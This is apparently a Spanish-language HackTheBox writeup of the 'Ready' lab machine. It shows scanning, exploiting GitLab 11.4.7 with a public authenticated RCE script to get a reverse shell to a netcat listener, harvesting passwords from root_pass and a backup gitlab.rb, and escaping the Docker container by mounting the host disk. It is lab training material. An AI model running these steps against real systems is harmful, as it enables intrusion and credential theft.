---
date: 2023-05-27 12:00:00
layout: post
title: Ready Writeup
subtitle: Writeup de la máquina Ready de la plataforma HackTheBox
description: Realizaré la máquina Ready explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Media.
image: https://byte-mind.net/wp-content/uploads/2020/12/ready-750x410.png
optimized_image: https://byte-mind.net/wp-content/uploads/2020/12/ready-750x410.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Linux
  - Medium
author: FredBrave
---
# Enumeración
Empezamos con dos escaneos a la máquina para encontrar puertos abiertos. El primer escaneo será rápido solo para encontrar los puertos abiertos. El segundo será mucho más exhaustivo esto es para encontrar versiones y muchas más información sobre el servicio corriendo en el puerto.
```bash
$ sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.227.132 -oG Targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 10:05 EDT
Nmap scan report for 10.129.227.132
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen

Nmap done: 1 IP address (1 host up) scanned in 43.98 seconds

$ sudo nmap -p22,5080 -sCV 10.129.227.132 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 10:07 EDT
Nmap scan report for 10.129.227.132
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
5080/tcp open  http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.227.132:5080/users/sign_in
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.91 seconds
```
Descubrimos los puertos 22 y el 5080. Entre estos el más interesante es el 5080 que es un http, así que enumeramos rápidamente el contenido del http.
<img class="img" src="/assets/img/machines/Ready/1.png" width="1000">
Encontramos un Gitlab, intento encontrar su versión para verificar si no es vulnerable a ningún exploit, pero no obtengo éxito. Por lo tanto decido crearme una cuenta viendo que me lo permite.
<img class="img" src="/assets/img/machines/Ready/2.png" width="1000">
<img class="img" src="/assets/img/machines/Ready/3.png" width="1200">
Una vez dentro traté de encontrar diferente información, pero al no encontrar nada interesante decido seguir tratando de encontrar la versión del Gitlab. Para esto usaré la API de este, podemos usar la API con un token que tenemos que crear por lo que decido crearme un token personal.
<img class="img" src="/assets/img/machines/Ready/4.png" width="1200">
Para esto entre a settings y luego a Access Tokens una vez aquí tengo que nombrar al token darle una fecha de caducidad elegir la opción api y crearlo.
<img class="img" src="/assets/img/machines/Ready/5.png" width="1000">
<img class="img" src="/assets/img/machines/Ready/6.png" width="1000">
Ya con este token podemos empezar a usar la api y conocer la versión del Gitlab que se está usando.
```bash
$ curl http://10.129.227.132:5080/api/v4/version -H "PRIVATE-TOKEN: 8MnPTY9vms9Tmot1sBJy"
{"version":"11.4.7","revision":"98f8423"}
```
# Shell como git (CONTENEDOR)
Una vez encontrada la versión intentamos encontrar un exploit de dicha version, ya que es anticuada.
```bash
searchsploit gitlab 11.4.7
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
GitLab 11.4.7 - RCE (Authenticated) (2)                                                                                                                                                                     | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                                                                                                                                                   | ruby/webapps/49257.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Intente usar los dos exploits, pero ninguno me funciono debido a esto tuve que buscar diferentes exploits en la web hasta que finalmente encontré uno que <a href="https://github.com/dotPY-hax/gitlab_RCE">funcionaba</a>.
```bash
$ git clone https://github.com/dotPY-hax/gitlab_RCE.git
Cloning into 'gitlab_RCE'...
remote: Enumerating objects: 84, done.
remote: Counting objects: 100% (84/84), done.
remote: Compressing objects: 100% (80/80), done.
remote: Total 84 (delta 26), reused 1 (delta 0), pack-reused 0
Receiving objects: 100% (84/84), 24.11 KiB | 4.02 MiB/s, done.
Resolving deltas: 100% (26/26), done.
$ cd gitlab_RCE
$ python3 gitlab_rce.py 
usage: gitlab_rce.py <http://gitlab:port> <local-ip>
```
Proporcione los datos necesarios y ejecuté el exploit.
```bash
$ python3 gitlab_rce.py http://10.129.227.132:5080 10.10.16.5                    
Gitlab Exploit by dotPY [insert fancy ascii art]
registering e3lsKaAKhb:c1ptwUVsf0 - 200
Getting version of http://10.129.227.132:5080 - 200
The Version seems to be 11.4.7! Choose wisely
delete user e3lsKaAKhb - 200
[0] - GitlabRCE1147 - RCE for Version <=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
type a number and hit enter to choose exploit: 0
Start a listener on port 42069 and hit enter (nc -vlnp 42069)
registering BahRzYRCgP:x7yVgDAJsI - 200
hacking in progress - 200
delete user BahRzYRCgP - 200
```
Gane una shell.
```bash
$ nc -nlvp 42069
listening on [any] 42069 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.227.132] 54598
bash: cannot set terminal process group (506): Inappropriate ioctl for device
bash: no job control in this shell
git@gitlab:~/gitlab-rails/working$ whoami
whoami
git
git@gitlab:~/gitlab-rails/working$
```
# Shell como root (CONTENEDOR)
Hice un tratamiento de la tty y empecé a buscar formas de escalar privilegios.
```bash
git@gitlab:/$ ls
RELEASE  assets  bin  boot  dev  etc  home  lib  lib64	media  mnt  opt  proc  root  root_pass	run  sbin  srv	sys  tmp  usr  var
git@gitlab:/$ cat root_pass
YG65407Bjqvv9A0a8Tm_7w
git@gitlab:/$ 
```
Me percato de que estamos en un contenedor por el dockerenv en la raíz y además encuentro un archivo llamado root\_pass con una clave.

Intente usar la clave, pero ningún intento en diferentes usuarios funciono.

Al seguir enumerando encuentro carpetas interesantes en el directorio /opt así que prosigo a enumerarla el backup contiene algunos archivos interesantes en los cuales trato de encontrar alguna clave.
```bash
git@gitlab:/$ cd /opt
git@gitlab:/opt$ ls
backup	gitlab
git@gitlab:/opt$ cd backup/
git@gitlab:/opt/backup$ ls
docker-compose.yml  gitlab-secrets.json  gitlab.rb
git@gitlab:/opt/backup$ cat gitlab.rb | grep pass
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: MD5_PASSWORD_HASH
# postgresql['pgbouncer_user_password'] = nil
git@gitlab:/opt/backup$
```
En el archivo gitlab.rb encuentro una clave que se ha usado en el smtp.
```bash
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```
Compruebo si es la clave de root.
```bash
git@gitlab:/opt/backup$ su root
Password: 
root@gitlab:/opt/backup# whoami
root
root@gitlab:/opt/backup#
```
Sigo enumerando y encuentro que en el /dev/sda2 existe un sistema linux.
```bash
root@gitlab:/opt/backup# fdisk -l
Disk /dev/loop0: 55.5 MiB, 58159104 bytes, 113592 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop1: 55.4 MiB, 58052608 bytes, 113384 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop2: 71.3 MiB, 74797056 bytes, 146088 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop3: 31.1 MiB, 32571392 bytes, 63616 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop4: 71.4 MiB, 74907648 bytes, 146304 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/loop5: 31.1 MiB, 32595968 bytes, 63664 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/sda: 10 GiB, 10737418240 bytes, 20971520 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: 84507D17-A861-4368-96D3-F3BE300D2DC9

Device        Start      End  Sectors  Size Type
/dev/sda1      2048     4095     2048    1M BIOS boot
/dev/sda2      4096 19920895 19916800  9.5G Linux filesystem
/dev/sda3  19920896 20969471  1048576  512M Linux swap
```
Prosigo a montarme este sistema en una montura.
```bash
root@gitlab:/opt/backup# mkdir /mnt/montura
root@gitlab:/opt/backup# mount /dev/sda2 /mnt/montura
root@gitlab:/opt/backup# cd /mnt/montura
root@gitlab:/mnt/montura# ls
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
root@gitlab:/mnt/montura#
```
Y encuentro la clave de root en la carpeta root.
```bash
root@gitlab:/mnt/montura# ls
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
root@gitlab:/mnt/montura# cd root
root@gitlab:/mnt/montura/root# ls
docker-gitlab  ready-channel  root.txt  snap
```
Hemos pwneado la maquina!
